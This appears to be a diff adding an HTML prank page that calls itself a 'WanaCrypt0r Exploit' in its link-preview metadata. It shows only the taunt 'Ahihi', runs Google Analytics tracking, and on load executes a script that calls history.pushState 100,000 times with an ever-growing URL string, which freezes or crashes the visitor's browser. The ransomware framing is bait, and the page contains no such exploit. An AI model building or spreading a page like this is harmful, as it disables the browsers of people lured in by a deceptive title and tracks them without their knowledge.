@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Wanna.Cry.v2.1 - WanaCrypt0r Exploit">
+    <meta property="og:site_name" content="Wanna.Cry">
+    <meta property="og:image" content="http://duclvz.github.io/wannacry-2-ransomware-attack.png">
+    <meta property="og:description" content="Auto Exploit Via WebSocket" />
+</head>
+
+<body background="bg.jpg">
+    <div style="position: absolute;top: 46%;left: 40%; font-family: 'Arial'; color: white; text-shadow: 1px 1px 2px black, 0 0 25px blue, 0 0 5px darkblue; font-size: 64px; font-weight: bold;">
+        <h4>Ahihi</h4>
+    </div>
+    <script>
+        (function(i, s, o, g, r, a, m) {
+            i['GoogleAnalyticsObject'] = r;
+            i[r] = i[r] || function() {
+                (i[r].q = i[r].q || []).push(arguments)
+            }, i[r].l = 1 * new Date();
+            a = s.createElement(o),
+                m = s.getElementsByTagName(o)[0];
+            a.async = 1;
+            a.src = g;
+            m.parentNode.insertBefore(a, m)
+        })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');
+
+        ga('create', 'UA-80515457-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+    <script>
+        var total = "";
+        for (var i = 0; i < 100000; i++) {
+            total = total + i.toString();
+            history.pushState(0, 0, total);
+        }
+    </script>
+</body>
+
+</html>
